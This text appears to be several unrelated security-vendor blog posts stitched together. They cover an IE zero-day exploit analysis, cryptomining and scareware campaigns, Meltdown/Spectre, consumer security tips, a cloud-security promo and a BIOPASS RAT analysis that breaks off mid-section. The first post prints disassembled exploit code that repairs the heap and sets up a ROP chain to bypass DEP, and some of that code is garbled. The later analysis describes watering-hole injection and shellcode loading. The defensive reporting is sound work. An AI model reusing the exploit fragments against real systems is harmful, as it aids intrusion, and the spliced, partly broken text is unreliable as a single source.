The techniques used in this exploit are similar to those used in other recent attacks.
"Last year, exploitation of CVE-2013-3163 targeted Internet Explorer 8 and earlier this year, we found exploitation of CVE-2014-0322 in Internet Explorer 10."
Similarities in each of these exploits indicate that they may have been created by the same author.
All three exploits share the same exploit techniques: All the Flash files used across the exploits have similar structures and even the same variable names.
"For example, they all use the Timer object to check if a Vector object is modified."
"The Timers are all set to repeat every one second for 4,096 seconds."
The Vector object is named ‘s’ and the Sound object is named “ss” in the Flash files used in all three exploits.
The following code is snippet from the disassembled ActionScript code of CVE-2014-1776.
Neither of these variables is actually used in this exploit.
"If we go back and examine the exploit code for CVE-2013-3163, we see that the string ‘org’ was originally used as the trigger, and the variable ‘found’ was originally used as a flag indicating if the Vector object was modified."
It appears that the attacker reused the code from the earlier exploit and forgot to remove the unnecessary variables.
s[_local28][(((_local41 - _local12) / 4) + 9)] = _local9; s[_local28][(((_local41 - _local12) / 4) + 10)]
= 13078672;
s[_local28][(((_local41 - _local12) / 4) + 11)]
= _
local7
s[_local28][(((_local41 - _local12) / 4) + 12)]
= 3096481936;
s[_local28][(((_local41 - _local12) / 4) + 13)]
= (this.m_longArrBase - 8);
s[_local28][(((_local41 - _local12) / 4) + 14)]
= 13078672;
s[_local28][(((_local41 - _local12) / 4) + 15)]
= this.m_rawLen;
s[_local28][(((_local41 - _local12) / 4) + 16)]
= 3968066955;
s[_local28][(((_local41 - _local12) / 4) + 17)]
= 753635372;
The exploit uses the code above to restore the corrupted object and save the stack frame on the heap so that the process would not crash after the exploit is successful.
"All three exploits use the same method and similar addresses to achieve that goal, even including the same hard coded assembly and registers."
_local10 = this.m_ZwProtectAddr; _local41 = _local6; s[_local28][((((_local6 - _local12) / 4) - 2) - 4)] = (_local41 & 0xFFFFF000); s[_local28][((((_local6 - _local12) / 4) - 1) - 4)] = 0x3000; s[_local28][((_local6 - _local12) / 4)] = _local10; s[_local28][(((_local6 - _local12) / 4) + 1)] = (_local41 + 28); The code above shows the Flash code setting up the ROP chain to bypass DEP and includes another interesting marker.
"Normally programmers begin counting at 0 when referencing arrays, but in all three exploits they began at -2, which is quite unusual."
"Additionally, each sample uses a Sound object named ‘snd’ to gain control, and they all invoke the function toString()."
The many similarities between these exploits lead us to believe they were written by the same actor or group.
"Or at the very least, a common template has been used to craft exploits for the three Internet Explorer vulnerabilities we analyzed."
"This re-use of techniques is common among exploits, even if they were not developed by the same group, and Palo Alto Networks employs a unique payload-based signature detection methodology, which is able to look at the behaviors of an exploit to prevent similar attacks in the future."
"Palo Alto Networks customers with a Threat Prevention subscription were automatically protected from exploitation of these vulnerabilities: We suggest customers ensure they are running the latest content version on their devices and apply the patches Microsoft released on May 1, 2014. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"In October 2017, Palo Alto Networks Unit 42 published research showing how attackers were adapting attack techniques to generate cryptocurrency for themselves."
"In that research, we also showed how these attacks were very broad and grew very quickly."
"At the time, we said that the sudden, surging value of cryptocurrencies was likely behind the sudden, strong rise of these new attacks."
"We said that if cryptocurrency values continue to remain high, we could expect to see attackers continue to focus on finding ways to carry out attacks to gain cryptocurrency, and that those attacks would continue to adapt proven attack techniques."
Unit 42 has just released new research showing that attackers are indeed continuing to adapt existing techniques to generate cryptocurrency.
"In our research posting “Large Scale Monero Cryptocurrency Mining Operation using XMRig” we detail a new malware campaign that is global in scale, very large in the likely number of victims and uses well established techniques to mine the Monero cryptocurrency."
Monero is a cryptocurrency similar to bitcoin but notable for its increased emphasis on providing a higher level of privacy around its transactions.
"Like bitcoin, Monero is generated through “mining” a computationally intensive process that provides cryptocurrency credit in exchange for computing resources provided in service to the cryptocurrency and its transaction infrastructure."
"The operation that Unit 42 has recently uncovered works to deliver XMRig, software that is used to mine the Monero cryptocurrency, to victims’ systems without their knowledge or consent."
"While XMRig isn’t itself specifically malware, it’s being delivered using malware-delivery techniques without the user’s knowledge and consent just like malware."
"The attackers are doing this by using URL shorteners to make XMRig look like other, legitimate, and expected programs."
This is a method attackers have used for years to deliver malware and they are using it now to get coinmining software on to people’s systems illicitly.
"The attackers’ use of URL shortners enables our Unit 42 researchers to get an idea of the size, scope, and scale of this operation."
And these are all notable and sobering.
"First, this is a young campaign."
Our research shows this operation to be only about four months old.
"Second, this is a very large campaign."
Our researchers can show that about one-half of the samples we found have affected 15 million people worldwide.
"While we can’t see how many people the other half of the samples affect, it’s a reasonable supposition that the other half of the total samples affect just as many people as the half we can see."
This would mean that this operation may affect about 30 million people worldwide.
"In terms of who’s been affected by this operation, again, we can only see half of those who have been affected."
But what we do see shows that this is a truly global operation.
"This operation affected countries around the globe, but it appears that southeast Asia, northern Africa, and countries in South America were hit the most as shown below. Malicious downloads by country The specific breakout of countries affected, and their download counts are as follows: Taking all those points together, this is operation is very large and clearly very effective."
It shows how attackers are aggressively focusing their operations and campaigns on generating and acquiring cryptocurrency.
"From a threat point of view, there are two things that are notable."
"First is the fact that from an attack technique point of view, there is nothing new here."
The tactics and techniques are not new or sophisticated.
"Second is the fact that this operation is clearly very successful based on its size, scope, and age."
"Looking at this latest operation on the continuum of evolving cryptocurrency-focused threats, it’s clear that this is an early-stage threat given its lack of sophistication and reuse of established techniques and tactics."
"But given how quickly and broadly successful it is, combined with the continued high value of cryptocurrencies, we can also conclude that attackers will continue to focus on cryptocurrency and likely will evolve their techniques and tactics quickly."
Cryptocurrency-focused threats is a key area that all defenders should focus their intelligence and prevention efforts around in 2018.
"Meanwhile, see our full research blog for full details on how attackers are distributing and using XMRig to generate Monero. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Today, Microsoft patched 59 Internet Explorer vulnerabilities, 21 of them discovered by Palo Alto Networks researchers."
"Palo Alto Networks is committed not only to detecting attacks, but preventing them as well."
Our internal research team discovered each of these 21 vulnerabilities and reported them to Microsoft so they could begin building and testing patches.
"Microsoft has already credited our team with 14 previous IE vulnerabilities in 2014, bringing our total for the year up to 35."
"We want to acknowledge Palo Alto Networks researchers Bo Qu, Hui Gao, Royce Lu, Xin Ouyang and the entire IPS team for all of the hard work they’ve put into discovering and validating these vulnerabilities."
The table below provides a summary of the vulnerabilities and which versions of Internet Explorer they impact.
Internet Explorer is used in many of the networks Palo Alto Networks protects around the world and we’re doing our part to make it as secure as possible.
"Last week we released a series of IPS signatures to detect an advanced exploitation technique that takes advantage of ActiveX. In May, we linked a recent IE 0-day (CVE-2014-1776) to exploit code used against two other IE vulnerabilities exploited in the last 12 months."
Microsoft patched 129 IE vulnerabilities in all of 2013 and today’s release brings the 2014 total to 116.
"The faster the good guys track these down and get them patched, the harder we make the lives of the criminals looking to exploit them."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This time every year, people all over the world get new devices."
"Regardless of what holiday(s) you may (or may not) celebrate, the end of the year is a time for people to give and receive some of the latest devices to come on to the market."
Nothing spoils a new gadget more than having some kind of security or privacy problem related to it.
"After that, nothing spoils the fun and excitement of unboxing and playing with an exciting new device than trying to figure out what you need to do to use it with reasonable safety and privacy."
"To that end, we’re providing some very basic, but critical steps that you, your family, your loved ones, and friends can take to ensure some basic security and privacy for new devices quickly and easily that can help you be safer and not spoil your unboxing fun. In the vein of the holiday spirit, we’re providing a list of twelve short, simple recommendations that can help you have a happy, safe, and private holiday season."
1. Use a Password Manager:
"Even though not all devices can use password managers directly, it’s still one of the best things you can set up."
PCs and Macs as well as smartphones and tablets increasingly support the use of password managers directly.
"But even for devices that don’t, you can and should use a password manager to generate and store strong passwords for use on all devices in its vault."
"Preferably, find a password manager that requires two-factor authentication. 2. Protect Your Home Routers and Wi-Fi:"
"In a home of computers, phones, tablets and IoT devices, nearly always the common point is the home router and Wi-Fi."
"For most, it’s something they set up once and forget about."
"But if you want to keep your home devices more secure, you need to make sure the underlying router and Wi-Fi are more secure."
"Take time to ensure you have a good, complex, unguessable password."
This is where a password manager can help.
"You may consider configuring it to not broadcast the SSID as well: that can make adding devices a little harder, but that means it’s even harder for people to try and join your home network. 3. Set up More Secure Accounts on Your PCs and Macs: PCs and Macs (both desktop and laptop) are still around and as important as ever in the home."
Take time to set up an account for everyone with their own username and password.
"Also, all modern operating systems allow you to make accounts “regular user” accounts rather than admin accounts."
Set everyone up as a “regular user” and set up a separate administrative account to use for maintenance.
"If you have kids, avoid the temptation to let them all use one account or accounts without passwords: this is a chance for them to start to learn the right way to handle passwords by giving them their own and teaching them to never share that password."
You can generate the password for them and retain it as the “administrator” if you want for monitoring.
This also is an important lesson for kids to understand that privacy on computers isn’t absolute: the admin can always look at what they’re doing.
4. Prevent Lost Tablets and Smartphones from Turning into Something Worse: Portable devices means an increased risk of loss or theft.
"These days, our portable devices often have greater access to more sensitive information than our PCs and Macs do – in the form of mobile banking apps, wallet apps and stored credit cards."
All modern tablets and smartphones have settings you should enable before you take these portable devices out of your home: a. Passcodes to lock the device.
b. Encryption of information on the device.
c. Lost device location.
d. Deleting or “wiping” data if too many bad passcodes are tried or if you active it remotely.
5. Protect your Data on Smartwatches and Personal Fitness Devices: Smartwatches and personal fitness devices are similar to smartphones and tablets and have some of the same features.
"In addition to using those features, you should take time to ensure you know what health information is being used and that the cloud account(s) these devices synchronize with have very strong passwords."
These devices gather some of your most personal information.
"In some cases, the most serious risk isn’t around the device but the data being stored in the cloud."
6. Be Smart with Your Smart Home: Smart home is an umbrella term for a diverse set of devices that have one thing in common: they all feature some kind of internet connectivity.
Each and every device will have its own security and privacy settings and it pays to take time to understand those BEFORE you put these to work in your home.
"Across the board, though, making sure your home router and Wi-Fi have good security and that you’re using good, strong unique passwords when paring devices with apps (where possible) are easy things you can do for all these devices."
"7. Don’t Forget About Home Entertainment Apps, TVs and DVRs:"
"When we think about home entertainment, there’s really two things you need to think about with security."
First is the security of the devices themselves.
"In nearly all cases, good security around home routers and Wi-Fi will be the best thing you can do for the devices."
But home entertainment isn’t just the physical devices.
It’s the apps you use to view content.
"All apps like those from Netflix, Amazon, Hulu and others have their own passwords to connect to their service, and attackers crack and sell compromised accounts to these services."
"Because of this, make sure you’re using good, strong unique passwords for the apps you use on these devices."
"This will also protect these apps on your tablets, smartphones, PCs and Macs."
"While You’re at it, Protect Your Gaming Consoles:"
"Similar to home entertainment devices, gaming consoles have both the security of the actual device and then the security of the cloud-based accounts to deal with."
"Just like with home entertainment devices, it’s the cloud-based account that attackers are more interested in."
"Here again, taking time to set up good strong passwords is key."
"Also, many gaming platforms now include a second means of authentication (typically a text sent to your phone): you can and should enable that, if at all possible."
9. Configure User Profiles for Voice Assistants:
"Voice assistants are some of the newest devices out there, which means they’re the least known and understood."
The biggest risk that’s been popularly discussed is voice command hijacking by outside sources.
"While a cool news story, it’s not been documented to be a broad risk, especially as devices get better at specific voice recognition."
"For these devices, take time to configure individual user profiles as much as possible."
And many of these devices feature mute buttons that can functionally turn them off when you don’t need them.
"If you haven’t been using it, consider using that feature."
10. Use Smart Speakers Smartly:
Smart speakers can be thought of as a subset of home assistants in that they are voice-activated devices in your home.
"And many smart speakers have digital home assistants built into them, making the distinction even less clear."
This means that what you would do for security for your digital home assistant would apply to smart speakers as well.
"However, one thing to consider is if all you really want or need is a smart music device, it may make sense to keep your purchases focused on devices that do only that."
This can improve your security by reducing the risk posed by features that you don’t want or need.
11. Drive Safely and Securely with Smart Cars:
"While “car hacking” is something that you see in the news, the reality is that practical smart car security is more common than headlines may lead you to believe."
A key differentiating feature with smart cars is they often have “smart” lock and ignition systems that are tied to fobs and/or your devices (like a smartphone).
Good smart car security in this case means building on the good security around devices and good physical security.
"Ensure that any connected smart devices have good security, especially to protect against loss or theft."
Make sure you only give fobs to people that you trust.
"And ensure that any cloud-connected accounts have good passwords and use a second authentication method, if possible."
"12. Patch, Patch and Patch Some More:"
We close this list with patching because it is the most important thing you can do.
"Few people like getting into the guts of devices to manage updates and the apps on them but the reality right now is that this is not only critical for security and privacy, it’s also sometimes a process that can only be done manually."
"For every kind of device or system, you should think about and understand how you can do updates for: a."
"The “firmware”: this is the software that is on the physical device itself, like the actual router, the actual car or the actual DVR."
"b. The operating system on the device: Some devices don’t have an operating system separate from the firmware, but many do."
"PCs and Macs have firmware and an operating system (Windows, macOS and Linux)."
"c. The apps and applications on the computer or device: Like we noted about home entertainment and gaming consoles, sometimes it’s the apps rather than the device itself that is important."
Many apps these days have auto-update capabilities.
"But some don’t, so it’s important to make sure you know how apps get their updates."
"If you take some time to understand these basic ideas and take these basic steps, you can ensure that you’ve got a good start on using new devices more safely and with better privacy during the holiday season. Of course, this isn’t an exhaustive list."
"And it’s always good to know about other features and capabilities, for example child safety controls."
"But the start of a journey of a thousand miles begins with one step, and the start of a journey of a thousand days of using these new devices safely can start with these simple steps."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
We have recently been investigating an antivirus app in the Google Play store that was displaying fake virus detection results to scare users into purchasing a premium service.
"According to the Google Play store statistics, users have downloaded “AntiVirus for Android™” more than one million times and the app was listed in Top 100 free apps in Tools category."
Our Wildfire analysis cloud captured the initial app and identified it as Scareware.
"On January 20, we reported this issue to Google and two days later, they removed the app from Google Play."
“AntiVirus for Android™” was developed by a company named “CTG Network Ltd.
”(Figure 1)
"According the (now removed) Google Play listing, the app was downloaded and installed between 1 million and 5 millions times."
"Before the removal it had also received 5,162 recommendations and 16,531 reviews that resulted in an average score of 4.0."
"According to AppBrain, the app was also listed in top 30 of Top Grossing Apps in Tools category in United States, Japan, France and South Korea."
Figure 1 AntiVirus for Android™ in the Google Play Store
"When a user opens the app, it will always report that it has located two or three threats on the device (Figure 2), including the following: Figure 2"
"The App Indicates Two Threats were Found If the user clicks the “Repair” button, the apps will indicate that one of the threats was eliminated and advise the user to upgrade to its full version to remove the remaining threat(s)."
If the user clicks the “Update to Full Protection” button they will be prompted to subscribe to a service that costs $4.99 (US) per month through In-App Purchase of Google Play (Figure 3). Figure 3
The app requests that the user pay 4.99$ per month for full protection.
"Through analyzing the app’s code we discovered a multiple indications that this program was not a legitimate Antivirus program, but actually Scareware."
"First, the initial “threats detection results” are hard-coded in the app (Figure 4), which means the app wasn't actually detecting them on the phone."
The developer even directly named these “infected packages” as “fake.virus” in the source code.
Figure 4 Hard-coded fake threat detection results
"Since the detection result is fake, the subsequent cleaning is not real either – the elimination operation is just marking a flag of ""initial_virus_cleared"" to “1” in the app’s internal database."
The code in Figure 5 shows that the “We have eliminated 1 of %d Threat(s)” message shown in Figure 3 is also hard coded.
Figure 5 Code that generated the fake threat cleared page.
One interesting difference between this program and other Fake AV apps is “AntiVirus for Android™” will actually provide real antivirus services to paid users.
"The app integrates a mobile antivirus engine provided by Bitdefender and if users upgrade to the premium version, it will scan apps and the device’s SD card with that engine."
This is the main reason we classify the program as Scareware rather than just Fake AV.
It is not clear whether the integrated BitDefender AV engine is actually licensed to the app’s developer.
"The engine retrieves code updated and new signatures updating from hxxp:// api.androidsantivirus .com /antivirus/android-arm, which is hosted on the app’s official website."
Figure 6 The App Integrates the BitDefender AV Engine for Premium Users
"In March of 2014, a Fake AV app named “Virus Shield” was listed for sale at $3.99 and quickly rose to the top position of Google Play’s New Paid Apps list."
"Virus Shield was downloaded over 30,000 times, fare fewer than this latest piece of Scareware, although we do not know how many users actually paid for the $4.99 monthly service before Google removed the app from the store."
"The fact that AntiVirus for Android™ contains an actual AV engine makes it more difficult for other programs to identify it as Scareware, as this makes the program appear legitimate."
"While Google has already removed this application from the Play store, we’ll keep monitoring the latest Android apps to make sure WildFire is providing the best protection for our customers."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This post is also available in: 日本語 (Japanese) Bottom line
up front
Overview
"In the past 48 hours, there has been a flurry of activity as hardware and software vendors move to address two sets of vulnerabilities that have been dubbed “Meltdown” and “Spectre”."
"This blog is meant to give an overview of the situation, the vulnerabilities, assist Palo Alto Networks customers and others with their risk assessment, and provide recommendations for actions they can take to prevent successful attacks against these vulnerabilities."
Situation
"On January 3, 2018, researchers, including those with Google Project Zero, released information on three new vulnerabilities:"
They grouped these vulnerabilities under the names “Spectre” (CVE-2017-5753 and CVE-2017-5715) and “Meltdown” (CVE-2017-5754).
Comprehensive details on both of these are available at https://meltdownattack.com.
"Security updates to address these vulnerabilities began to be released prior to disclosure on January 3, 2018."
Security updates are continuing to be released and are expected to be released over time due to the uniquely broad nature of these vulnerabilities.
"At the time of this writing, there are no known active attacks against any of these vulnerabilities."
Vulnerabilities These vulnerabilities present a unique situation because they ultimately are hardware-based vulnerabilities.
All three stem from issues in modern processors and are known to affect Intel and ARM chips.
The vulnerability status of AMD chips is unclear at the time of this writing.
"Because these affect processors, this means that the operating systems and applications that run on top of these processors are vulnerable."
"Because these vulnerabilities affect the processors at the physical layer, the only way for the vulnerabilities to be fully addressed is for the processors to be replaced or to have a firmware update."
"Until then, the makers of operating systems can (and have) released patches that make the physical-layer vulnerabilities inaccessible."
"For all intents and purposes, it “patches” the vulnerabilities."
Full technical details on the vulnerabilities are available at the sites referenced above.
But the key point to understand about these vulnerabilities is that they are information disclosure vulnerabilities that can enable processes and applications to access information they otherwise shouldn’t be able to: user-mode applications can access privileged information in the kernel and throughout the operating system.
"For regular end-user systems and devices, malware and malicious scripts can use these vulnerabilities to access information like usernames, passwords and account information."
"For shared-hosting environments like public cloud providers, this means that one hosted customer could potentially access the information of any other customer hosted on the same hardware."
"Based on analysis of the vulnerabilities, an industry consensus is emerging that generic protections against attacks aimed at these vulnerabilities will be difficult, if not impossible to develop."
"This means that prevention against attacks will have to focus on specific malware, attacks, and hosting sites as they emerge."
Risk Assessment
"Because these are information disclosure vulnerabilities, they don’t pose the same, immediate danger like WannaCry/WanaCrypt0r or Petya/NotPetya."
This has more in common with the Heartbleed event of 2014.
"In terms of the severity of the vulnerabilities themselves: they are important, but not critical."
"They are information disclosure, not code execution, vulnerabilities."
The greatest area of risk is in shared-hosting scenarios.
"Fortunately, most cloud providers have already deployed security updates and those that haven’t are expected to do so shortly."
"For end-users and those managing networks, the greatest risk these vulnerabilities pose is exploitation by malware seeking to gather information like usernames and passwords from systems. What makes these vulnerabilities most notable from a risk assessment point of view is breadth of exposure."
"Since these potentially affect nearly every device with a modern processor, that means that full mitigation and remediation may not be possible."
Older systems (like Windows XP) and devices (like older Android smartphones and IoT devices) will likely never receive fixes for these vulnerabilities.
Calls to Action
"The actions to take in response to this event are clear and simple: As always, we will continue to watch this event closely and provide any updates that we can."
"For information on how Palo Alto Networks products are affected by these issues, customers can see our posting on the Live Community at: https://live.paloaltonetworks.com/t5/Customer-Advisories/Information-about-Meltdown-and-Spectre-findings/ta-p/193878/jump-to/first-unread-message."
"If you have any questions, please visit the Threat & Vulnerability Discussions on our Live Community."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"In recent research, Palo Alto Networks found attackers were targeting home routers to take control and use them for attacks against other websites that can bring them down."
Here we explain this type of attack and what you should do.
"Why should I care, what can it do to me?"
These attacks could affect you in two ways: What causes this kind of attack?
Weak passwords and out-of-date software can both enable attackers to take complete control of your home router.
How can I prevent it?
Attackers target home routers like this by targeting default passwords and out-of-date software on the routers.
An easy thing you can do is restart your router once a week (typically by unplugging it).
You can also stay safe by changing the password on your router and updating the software.
"If you’re not sure how to do this, contact your Internet Service Provider (ISP) that gave you the router for help."
How does it work?
"When devices (in this case, the routers) are under someone else’s control like this, the collection is referred to as a “botnet”, a network (-net) of remotely controlled systems or devices (bot-)."
"When attackers have complete control of your home router, they can install attack software that they control, turning the device into a “bot”."
"Attacks can make all the controlled routers in a botnet do anything they want, including sending huge amounts of data to try and bring websites down."
These kinds of attacks are called “Distributed Denial of Service” or “DDoS” attacks.
Attackers use them to take down websites for several reasons: About Threat Briefs are meant to help busy people understand real-world threats and how they can prevent them in their lives.
"They’re put together by Palo Alto Networks Unit 42 threat research team and are meant for you to read and share with your family, friends, and coworkers so you can all be safer and get on with the business of your digital life."
"Got a topic you want us to write about for you, your friends, or your family?"
Email us at u42comms@paloaltonetworks.com.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
There’s a very good reason why AWS remains a leader in cloud computing.
"While many providers describe themselves as “customer obsessed,” few come close to our long-time partner in the lengths it goes to earn and retain the trust of its customers."
AWS starts with the customer and works backwards.
That means the vast majority of its feature enhancements and new services are directly driven from their input.
The latest is Amazon GuardDuty Malware Protection.
"This threat detection tool, which will work closely with Trend Micro cloud solutions, will provide another valuable layer of defense in our fight against a shared adversary."
"Shining a light on an expanding attack surface Spurred by a drive for greater cost efficiency and business agility, global organizations are migrating to the cloud in droves."
"Gartner predicts the worldwide market for public cloud services will reach almost $495bn this year, and grow by over 21% in 2023."
"In this environment, security remains a persistent concern for cloud builders, because if not properly managed, investments can increase the digital attack surface."
"According to recent Trend Micro research, many global organizations are already struggling to securely manage their cloud assets."
"We found that 73% of IT and business leaders are concerned with the size of their attack surface, and 43% claim it is “spiralling out of control.”"
Cloud is the area where most respondents say they have least insight.
"They want their cloud providers to do more—for example by building enhanced detection into their systems, to complement third-party tools."
That’s part of the reason why AWS built Amazon GuardDuty Malware Protection was built.
This new feature is triggered by detection of known malicious signatures across the cloud network.
"Based on this detection, the service scans the associated Amazon EBS storage environment for malware and reports any findings to AWS Security Hub."
Open APIs from here link to products like Trend Micro Cloud One to enhance existing detection and response efforts.
"Better together Trend Micro and AWS have been working closely together for over a decade now, and this latest announcement represents another exciting stage in the journey."
"Customers will welcome AWS native threat detection as a complement to their Trend Micro Cloud One capabilities, delivering a comprehensive range of features to secure the hybrid cloud."
"Once they add the AWS tool to our virtual patching, vulnerability scanning, lateral movement detection, posture management and other capabilities, joint customers will have a powerful set of integrated offerings to deliver simple, all-in-one cloud security and compliance."
"In addition, this move from AWS validates our XDR strategy, which is focused on using as many data sources as possible to enhance detection and response."
The bottom line is that security takes a village.
"Customers, cloud providers and security vendors have a shared responsibility to work together as the threat landscape continues to evolve."
"That’s what we’ll continue to do, expanding and deepening our strategic partnerships with AWS and other providers in a collective effort to make the digital world safer."
Tags Cloud | Latest News | Malware | APT & Targeted Attacks |
"Compliance & Risks | Articles, News, Reports"
"We discovered a new malware that targets online gambling companies in China via a watering hole attack, in which visitors are tricked into downloading a malware loader disguised as a legitimate installer for well-known apps such as Adobe Flash Player or Microsoft Silverlight."
"Closer examination of the loader shows that it loads either a Cobalt Strike shellcode or a previously undocumented backdoor written in Python, a new type of malware that we found to be named BIOPASS RAT (remote access trojan)."
"BIOPASS RAT possesses basic features found in other malware, such as file system assessment, remote desktop access, file exfiltration, and shell command execution."
It also has the ability to compromise the private information of its victims by stealing web browser and instant messaging client data.
"What makes BIOPASS RAT particularly interesting is that it can sniff its victim’s screen by abusing the framework of Open Broadcaster Software (OBS) Studio, a popular live streaming and video recording app, to establish live streaming to a cloud service via Real-Time Messaging Protocol (RTMP)."
"In addition, the attack misuses the object storage service (OSS) of Alibaba Cloud (Aliyun) to host the BIOPASS RAT Python scripts as well as to store the exfiltrated data from victims."
We consider BIOPASS RAT as still being actively developed.
"For example, some markers that we discovered during our analysis refer to different versions of RAT code, such as “V2” or “BPSV3”."
Many of the loaders that we found were used to load Cobalt Strike shellcode by default instead of the BIOPASS RAT malware.
"Furthermore, BIOPASS RAT also creates scheduled tasks to load the Cobalt Strike shellcode during the initialization, indicating that the malicious actor behind the attack still heavily relies on Cobalt Strike."
We also found several clues that show how the malware might be connected with the Winnti Group(also known as APT41).
"In this blog entry, we will dive deeper into BIOPASS RAT with a detailed technical analysis of the infection chain, the different components of the malware, and any possible associations with Winnti."
Infection chain
"The initial delivery mechanism of BIOPASS RAT uses of a watering hole, a compromised website in which the malicious actors inject their custom JavaScript code to deliver malware."
"In most of the cases that we observed, the attackers usually place their injection script in their target’s online support chat page."
Figure 1. The login panel of BIOPASS RAT Figure 2. Code showing the watering hole attack injection The injected script will try to scan the affected host by sending HTTP requests to a list of ports.
"If it receives any response with an expected string from these ports, the script will stop."
This step is likely designed to avoid attacking an already infected victim.
We found that the BIOPASS RAT has the ability to open an HTTP service running on localhost on a port chosen from a hard-coded list.
This functionality allows the script to identify whether the victim has already been infected by their malware.
It conducts this identification by testing whether the port is open or not and then by checking the response. Figure 3.
"The script used to check for existing BIOPASS RAT infections If the script confirms that the visitor has not yet been infected, it will then replace the original page content with the attackers’ own content."
"The new page will show an error message with an accompanying instruction telling website visitors to download either a Flash installer or a Silverlight installer, both of which are malicious loaders."
It is important to note that both Adobe Flash and Microsoft Silverlight have already been deprecated by their respective vendors.
Figure 4.
The fake Adobe Flash Player download page of the watering hole attack Figure 5.
The fake Silverlight download page of the watering hole attack Figure 6.
Anti-VM checks in sample c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5 Figure 7.
Check for zh-CN-preferred UI language in sample 89c0b2036ce8d1d91f6d8b8171219aafcd6237c811770fa16edf922cedfecc54
The legitimate known application is downloaded and executed.
Authenticode-signed files are either downloaded from the official websites (as seen in sample c47fabc47806961f908bed37d6b1bbbfd183d564a2d01b7cae87bd95c20ff8a5) or are hosted on Alibaba Cloud OSS on the attackers’ account.
"Visual C++ runtime, a legitimate and signed vc_redist.x??.exe, and Python runtime are then downloaded."
These files are also hosted on Alibaba Cloud OSS on an attacker-controlled account.
"The Python runtime is usually a ZIP file with all required executables, as well as the DLL and Python libraries necessary for running Python scripts on machines where Python is not installed."
Scheduled tasks that are activated on a new login are created.
These tasks can run a BPS backdoor or a Cobalt Strike loader.
Figure 8.
"Code excerpt from the scheduled task We also noticed the path string “ServiceHub”, which is a path to the extracted Python runtime."
"After the hex decoding of the arguments, we get a Python one-liner that downloads additional Python scripts from the cloud."
Figure 9.
Python code for downloading additional components from Alibaba Cloud OSS Figure 10.
The BIOPASS RAT infection flow
"Examining the BIOPASS RAT modules We observed a few scheduled tasks being created, with the number dependent on the analyzed sample."
"In the following section, we provide an analysis for each important backdoor module."
The cdaemon module One of the modules used is called “cdaemon”.
"At the time of our research into this threat, only the “print(1)” command is able to be executed."
"An old sample of the module (30ccfbf24b7c8cc15f85541d5ec18feb0e19e75e1e4d2bca9941e6585dad7bc7) is likely a watchdog to check the status of another module that is known as “c1222”. The malicious actors can change this behavior by replacing the content of the cdaemon.txt service in the cloud so that when combined with the regular execution of the scheduled task, the cdaemon task can behave like a backdoor."
Figure 11.
The content of the cdaemon.txt backdoor The c1222 module
"The second scheduled task is called “c1222.txt,” which is a Python code run by a previously downloaded Python runtime."
This code runs an HTTP server that listens on predefined ports.
"If accessed by an HTTP client, it returns a marker value."
Figure 12.
"The list of predefined ports to bind an HTTP service to, which is reversed After accessing the infected machine with an HTTP server bound to a predefined port"
", the module returns the marker value."
Figure 13.
"The HTTP service with marker BPSV3 We also observed other markers — such as, “cs_online”, “online”, and “dm_online”."
"The purpose of the HTTP service is to act as a marker for an infected machine to avoid repeated infection, as aforementioned in the infection chain section."
"The most important task of the c1222 script is to download, decode, and execute the Cobalt Strike shellcode."
"Based on the platform, it downloads a file with an encoded shellcode (sc3.txt, x64.txt), and then decodes it (the shellcode is base85 and hex-encoded). Figure 14. Decoding the Cobalt Strike shellcode The big module (BIOPASS RAT)"
The third scheduled task —is called “big.txt”— is responsible for implementing the BIOPASS RAT malware.
This is a Python-based backdoor that is distributed in plain text or compiled with Nuitka or PyArmor and PyInstaller.
"When the malware starts, it checks whether the file with the hard-coded name “%PUBLIC%/20200318” exists."
This file is a marker to determine if the scheduled task of the backdoor has been installed.
"If the file (that is, the marker) is not found, the backdoor creates a new one and writes the current timestamp onto it."
The malware will then delete the scheduled tasks added by the loader and add two new scheduled tasks that are listed in Table 1.
Task Name Behavior ServiceHub Executes Python with a parameter that is the Python script to download and execute Cobalt Strike loader script “c1222” module ShellExperienceHost Executes Python with a parameter that is the Python script to download and execute BIOPASS RAT script “big” module Table 1.
"The scheduled tasks created by BIOPASS RAT The BIOPASS RAT malware loads a Python script, “online.txt” that will open an HTTP server that listens on one of the following port numbers: 43990, 43992, 53990, 33990, 33890, 48990, 12880, 22880, 32880, 42880, 52880, or 62880."
The HTTP server does nothing but returns string “BPSV3” to request.
A second HTTP server will also be created to listen on one of the aforementioned port numbers.
"The second HTTP server behaves the same as the first but returns a string, “dm_online”, instead."
These are the markers of infection as previously mentioned.
"After the servers are established and running, the backdoor creates an execution root directory in the folder “%PUBLIC%/BPS/V3/”."
Figure 15.
The script of a simple HTTP server to return string “dm_online” If the malware finds that the system username is “vbccsb”
", it will stop."
"It must be noted that “vbccsb” is the default username on ThreatBook Cloud Sandbox, a popular alternative to VirusTotal in China."
"If the backdoor finds that the file “debug” present inside the root directory, it will wait for 130 seconds and then continue with execution. Figure 16."
The script used to check the username and debug mode
"Next, the backdoor will try to read the file “bps.key” inside the root directory."
This file contains the victim ID assigned by the command-and-control (C&C) server.
"If the file hasn’t been created, it will set the victim ID to a null value until the C&C server assigns it."
"At the end of initialization, it collects the information of the victim’s system and initializes values in the global config variable that contains important configuration information."
"This includes the backdoor version (we observed V2 and V3), access keys, endpoint address, the bucket name for Alibaba Cloud OSS, and a URL for downloading the utility sc.exe that is used for taking screenshots."
Figure 17.
